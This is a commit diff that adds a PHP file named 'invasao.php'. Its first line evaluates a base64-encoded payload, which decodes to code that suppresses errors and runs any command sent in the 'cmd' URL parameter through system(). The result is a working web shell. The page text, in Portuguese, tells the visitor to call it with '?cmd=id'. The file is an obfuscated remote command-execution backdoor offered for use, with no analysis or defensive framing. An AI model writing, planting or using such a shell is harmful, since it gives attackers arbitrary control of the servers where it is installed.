47028e7b24be358c30d7371cec15d245a1f96ffd
francoa.taffarel <francoa.taffarel@gmail.com>
2021-05-01 12:31:49 -0300

    Add files via upload

---
+++ invasao.php
@@ -0,0 +1,12 @@
+<?php eval(base64_decode("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGNtZD0kX0dFVFtjbWRdOyBzeXN0ZW0oJGNtZCk7IA")); ?>
+<hmtl>
+<body>
+
+
+<br>
+Na barra de endereços digite:
+
+/invasao.php?cmd=id
+
+</body>
+</html>
